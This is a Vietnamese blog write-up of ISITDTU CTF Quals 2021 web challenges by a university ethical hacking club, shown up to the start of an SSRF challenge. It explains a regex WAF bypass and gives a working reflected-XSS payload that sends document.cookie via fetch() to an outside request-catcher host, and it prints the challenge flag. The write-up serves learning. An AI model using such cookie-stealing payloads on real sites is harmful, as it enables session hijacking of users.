<!DOCTYPE html><html lang="vi" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Write-up for all ISITDTU CTF Quals 2021 ‘s web challenges" /><meta name="author" content="antoinenguyen_09" /><meta property="og:locale" content="vi" /><meta name="description" content="TLDR:" /><meta property="og:description" content="TLDR:" /><link rel="canonical" href="https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/" /><meta property="og:url" content="https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/" /><meta property="og:site_name" content="Ethical Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-08T11:22:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Write-up for all ISITDTU CTF Quals 2021 ‘s web challenges" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@antoinenguyen_09" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2021-12-08T11:22:00+07:00","datePublished":"2021-12-08T11:22:00+07:00","description":"TLDR:","mainEntityOfPage":{"@type":"WebPage","@id":"https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/"},"url":"https://fptu-ethical-hackers-club.github.io/posts/ISITDTU-Quals-Web/","@type":"BlogPosting","author":{"@type":"Person","name":"antoinenguyen_09"},"headline":"Write-up for all ISITDTU CTF Quals 2021 ‘s web challenges","@context":"https://schema.org"}</script><title>Write-up for all ISITDTU CTF Quals 2021 's web challenges | Ethical Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ethical Hackers Club"><meta name="application-name" content="Ethical Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.updateMermaid(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ethical Hackers Club</a></div><div class="site-subtitle font-italic">FPT University</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a id="mode-toggle-wrapper" tabindex="0" onclick="flipMode()"> <i class="mode-toggle fas fa-adjust"></i> </a> <span class="icon-border"></span> <a href="https://github.com/FPTU-Ethical-Hackers-Club" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://facebook.com/ehc.fptu" aria-label="facebook" target="_blank" rel="noopener"> <i class="fab fa-facebook"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ehc.fpt','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Write-up for all ISITDTU CTF Quals 2021 's web challenges</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Write-up for all ISITDTU CTF Quals 2021 's web challenges</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/antoinenguyen-09">antoinenguyen_09</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2021-12-08 11:22:00 +0700" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 8, 2021, 11:22 AM +0700" >Dec 8</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4933 words"> <em>27 min</em> read</span></div></div></div><div class="post-content"><h2 id="-tldr"><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/147461703-92698857-2d41-44fa-83bc-825b67e3d567.png" alt="image" /> TLDR:<a href="#-tldr"><i class="fas fa-hashtag"></i></a></h2></h2><p>Ở <a href="https://ctftime.org/event/1464">ISITDTU CTF 2021</a> thì team <a href="https://ctftime.org/team/162744">0ni0n</a> của mình đã không vào được Final. Tuy nhiên, với tinh thần tham gia giải lần đầu để học hỏi là chính thì mình quyết định write-up lại toàn bộ web challenge ở vòng Quals này, kể cả các challenge mình chưa giải được, nhìn chung tất cả đều thú vị và nhiều “hành”.</p><h2 id="-simplewaf"><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/147461736-3c4051fc-e4e0-44ac-be5b-3bff75f4ed09.png" alt="image" /> simpleWAF<a href="#-simplewaf"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Đây là challenge web đầu và cũng là dễ nhất trong 4 challenge của ISITDTU CTF năm nay. Dù vậy vì một số lí do ngu người nên mất cả buối sáng mình mới solve đc bài này.</p></blockquote><p><img data-proofer-ignore data-src="https://i.imgur.com/mSwImhB.png" alt="" /></p><p>[+] <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/tree/master/ISITDTU%20CTF/2021/web/simpleWAF/source">Source</a></p><h3 id="1-initial-reconnaissance">1. Initial reconnaissance:<a href="#1-initial-reconnaissance"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143764818-b63dd063-04cf-4de2-afe7-6fa69f0d859c.png" alt="image" /></p><ul><li>Nhìn qua challenge này cho hẳn source với rất nhiều regex, cùng với một cái url parameter to tướng ở phía trên tên là <strong>XSS</strong> thì chắc chắn hướng đi sẽ là từ <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">reflected XSS</a> lấy cookie của client.<li>Đề bài còn cho biết: <code class="language-plaintext highlighter-rouge">if you can steal cookie, bot will check it at here</code>, nghĩa là sau khi exploit lấy cookie thành công từ site chính rồi, chúng ta sẽ submit payload cho con bot dưới đây check xem có hợp lệ và nếu đúng nó sẽ trả cho chúng ta flag.</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143770699-6dc9cc9b-9879-4be6-a6ca-186c8bac69c4.png" alt="image" /></p><h3 id="2-analyze-and-find-the-vulnerabilities">2. Analyze and find the vulnerabilities:<a href="#2-analyze-and-find-the-vulnerabilities"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Đầu tiên, website sẽ lấy ra string từ url parameter <code class="language-plaintext highlighter-rouge">xss</code> rồi check xem nó đã đc url encode chuẩn chưa (thông qua vòng while). Sau đó nếu như trong string đó có các <a href="https://www.w3schools.com/html/html_entities.asp">HTML entities</a> thì nó sẽ trở về dạng HTML tag bình thường thông qua hàm <code class="language-plaintext highlighter-rouge">html_entity_decode</code>.</ul><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$xss</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">];</span>

<span class="nv">$tmpxss</span> <span class="o">=</span> <span class="nv">$xss</span><span class="p">;</span>
<span class="k">do</span>
<span class="p">{</span>
    <span class="nv">$xss</span> <span class="o">=</span> <span class="nv">$tmpxss</span><span class="p">;</span>
    <span class="nv">$tmpxss</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$xss</span><span class="p">);</span>
<span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$tmpxss</span> <span class="o">!=</span> <span class="nv">$xss</span><span class="p">);</span>

<span class="nv">$xss</span> <span class="o">=</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nv">$xss</span><span class="p">);</span>
</pre></table></code></div></div><ul><li>Tiếp theo là phần phải đụng cơ tay một tí là bypass regex. Nhìn qua ta có thể thấy regex sẽ filter các string như <code class="language-plaintext highlighter-rouge">on&lt;gì đó&gt;=</code>, <code class="language-plaintext highlighter-rouge">src=</code>, <code class="language-plaintext highlighter-rouge">href=</code>, <code class="language-plaintext highlighter-rouge">&lt;script</code>, <code class="language-plaintext highlighter-rouge">&lt;object</code> nếu nó xuất hiện trong biến <strong>$xss</strong> ở trên. Nếu có xuất hiện sẽ in ra <code class="language-plaintext highlighter-rouge">WAF block</code>, nếu không thì payload là hợp lệ và sẽ được in ra</ul><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&lt;\w+.*on\w+=.*/i"</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">))</span>
<span class="p">{</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&lt;\w+.*src=.*/i"</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">))</span>
<span class="p">{</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&lt;\w+.*href=.*/i"</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">))</span>
<span class="p">{</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&lt;script.*/i"</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">))</span>
<span class="p">{</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\&lt;object.*/i"</span><span class="p">,</span> <span class="nv">$xss</span><span class="p">))</span>
<span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$valid</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$xss</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"WAF block"</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li>Các string như <code class="language-plaintext highlighter-rouge">on&lt;gì đó&gt;=</code>, <code class="language-plaintext highlighter-rouge">src=</code>, <code class="language-plaintext highlighter-rouge">href=</code>, <code class="language-plaintext highlighter-rouge">&lt;script</code>, <code class="language-plaintext highlighter-rouge">&lt;object</code> thường xuất hiện trong các xss payload, giờ đã bị ban. Vậy thì làm sao để nó hợp lệ? Chợt nhận ra thằng web này nó chỉ cấm mình dùng <code class="language-plaintext highlighter-rouge">on&lt;gì đó&gt;=</code> chứ không cấm mình dùng <code class="language-plaintext highlighter-rouge">on&lt;gì đó&gt; =</code> (thêm 1 dấu cách vào, thậm chí muốn chắc kèo thêm kí tự <code class="language-plaintext highlighter-rouge">\n</code> vào cũng được luôn). Thí dụ chúng ta có thể xài một cái payload như này:</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143773209-5d07eee5-5b17-498b-ad75-e9ea595ab3b1.png" alt="image" /></p><ul><li>Dùng payload <code class="language-plaintext highlighter-rouge">w</code> rồi thử alert một cái chơi:</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143773362-d7eec521-a23b-4005-9ab5-2095e14b2627.png" alt="image" /></p><p>Amazing, giờ viết script để gửi cookie về domain của mình thôi!</p><h3 id="3-exploit-and-get-flag">3. Exploit and get flag:<a href="#3-exploit-and-get-flag"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Ý tưởng về việc steal cookie nó sẽ tóm gọn như này (sử dụng <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">fetch API</a>):</ul><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;URL muốn gửi đến&gt;</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
<span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span><span class="p">,</span>
<span class="na">body</span><span class="p">:</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
<span class="p">});</span>
</pre></table></code></div></div><ul><li>Nhét nó vào payload để chạy trên web này nó sẽ thành như sau:</ul><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cimg%20src/%20%0Donerror%0D%20=%22fetch(%27<span class="nt">&lt;URL</span> <span class="na">muốn</span> <span class="na">gửi</span> <span class="na">đến</span><span class="nt">&gt;</span>%27,%20{method:%20%27POST%27,%20mode:%20%27no-cors%27%20,body:document.cookie})%22%3E
</pre></table></code></div></div><ul><li>Ví dụ ta có url muốn gửi đến là <code class="language-plaintext highlighter-rouge">https://jxkku1rri7bor6fs1hjaeu4yyp4fs4.burpcollaborator.net</code> (sử dụng <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator client</a> để tạo các domain như này, đồng thời bắt các request gửi về khi payload chạy):</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143773913-d5425ee3-7ba7-4b17-903e-c1745f5c11cb.png" alt="image" /></p><ul><li>Tiếp theo mình sẽ submit cái nguyên si cái payload này cho con bot để lấy flag và tiếp tục sử dụng Burp Collaborator client để bắt request, và đây là nơi cái ngu bắt đầu :).</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143774022-ae572395-e947-444b-85b6-4a4afc68f653.png" alt="image" /></p><ul><li>Không hiểu bằng một cách magic nào đó mà lần này nó chỉ gửi mỗi DNS request đến Burp Collaborator client, trong khi thứ ta đang cần là một HTTP request như ảnh trên :(. Mình đã tốn thời gian cho một việc ngu ngốc là gửi đi gửi lại dù biết nó sẽ sai, cho đến khi được người ra đề là anh “0xd0ff9” gõ đầu mới ngộ ra:</ul><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143774177-8f380b14-b5d1-44b8-ab92-56f52b32cda0.png" alt="image" /></p><p>Có vẻ có vấn đề gì đó với policy của Chrome phiên bản mới nhất, sau một hồi search gg và hỏi khắp nới thì t biết được policy của chrome mới nhất ko cho phép redirect qua HTTP, do đó Burp Collaborator client sẽ không bắt được HTTP. Nhưng mà trước khi biết được điều này thì t đã mò đại được cái webhook hay ho https://requestcatcher.com/ này để bắt request, và nó đã hoạt động :D</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143775278-0fd6ae7b-b568-4aed-aacd-4040af89a807.png" alt="image" /></p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/143775285-b2183718-ad8e-4ba4-b72d-0bf8a88794db.png" alt="image" /></p><p>My final payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://simplewaf.duckdns.org/6ef051ac3d7b644cb6b3c22fef5677a1/?xss=%3Cimg%20src/%20%0Donerror%0D%20=%22fetch(%27https://antoine.requestcatcher.com/%27,%20{method:%20%27POST%27,%20mode:%20%27no-cors%27%20,body:document.cookie})%22%3E
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">ISITDTU{64858f4560416acff930bf673b5046911947a26e}</code></p><h2 id="-lastpoint"><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/147461736-3c4051fc-e4e0-44ac-be5b-3bff75f4ed09.png" alt="image" /> lastpoint<a href="#-lastpoint"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Challenge này thì nhờ 1 chút “rùa” và chăm đọc cheat sheet mà mình giải nhanh hơn bình thường :D</p></blockquote><p><img data-proofer-ignore data-src="https://i.imgur.com/SA9isKs.png" alt="" /></p><p>[+] <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/tree/master/ISITDTU%20CTF/2021/web/last%20point/source">Source</a></p><h3 id="1-initial-reconnaissance-1">1. Initial reconnaissance:<a href="#1-initial-reconnaissance-1"><i class="fas fa-hashtag"></i></a></h3></h3><p>Đầu tiên chúng ta cần tạo account để login vào:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/6e4zTGP.png" alt="" /></p><p>Xem qua source của trang <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/login.php">login</a> và <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/register.php">register</a> cũng bình thường không có gì, chỉ còn mỗi 2 trang <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/index.php">index</a> và <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/last%20point/source/src/home.php">home</a> để chúng ta xem xét.</p><h3 id="2-analyze-and-find-the-vulnerabilities-1">2. Analyze and find the vulnerabilities:<a href="#2-analyze-and-find-the-vulnerabilities-1"><i class="fas fa-hashtag"></i></a></h3></h3><h4 id="a-indexphp">a) index.php:<a href="#a-indexphp"><i class="fas fa-hashtag"></i></a></h4></h4><p><img data-proofer-ignore data-src="https://i.imgur.com/9iZ7VYu.png" alt="" /></p><p>Mới nhìn vào có vẻ đây là tính năng nhập một URL bất kì rồi trả về nội dung của URL đó. Hướng đi của challenge này có vẻ là là khai thác <a href="https://portswigger.net/web-security/ssrf">SSRF</a> rồi. Nhưng trước hết chúng ta sẽ gặp vật cản đầu tiên là hàm <code class="language-plaintext highlighter-rouge">filter</code> dưới đây:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">filter</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$black_lists</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'0.0.0.0'</span><span class="p">];</span>
	<span class="nv">$url_parse</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
	<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$url_parse</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$black_lists</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Tác giả đã lộ rõ ý đồ blacklist 2 ip là <code class="language-plaintext highlighter-rouge">127.0.0.1</code> và <code class="language-plaintext highlighter-rouge">0.0.0.0</code>, vì 2 ip này đếu trỏ đến <code class="language-plaintext highlighter-rouge">localhost</code>, điểm mấu chốt để khai thác SSRF. Thậm chí ngay cả khi bạn nhập vào url <code class="language-plaintext highlighter-rouge">https://localhost/home.php</code> rồi submit thì nó cũng cho kết quả tương tự:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/r5pdh7A.png" alt="" /></p><p>Không những blacklist 2 ip này mà tác giả còn sanitize và validate biến <code class="language-plaintext highlighter-rouge">$url</code> bằng cách lowercase, regex. Nếu pass qua được hết thì một curl session sẽ được tạo với biến <code class="language-plaintext highlighter-rouge">$url</code>, kết quả của curl session này sẽ được trả về tại biến <code class="language-plaintext highlighter-rouge">$output</code> (tham khảo về cách dùng curl tại <a href="https://viblo.asia/p/curl-va-cach-su-dung-trong-php-naQZRAXdKvx">đây</a>). Còn nếu không pass sẽ kết thúc chương trình và in ra “NO NO NO NO” như hình trên:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$url</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
<span class="nv">$check</span> <span class="o">=</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="no">FILTER_VALIDATE_URL</span><span class="p">,</span><span class="no">FILTER_FLAG_IPV4</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/(^https?:\/\/[^:\/]+)/'</span><span class="p">,</span><span class="nv">$url</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$check</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
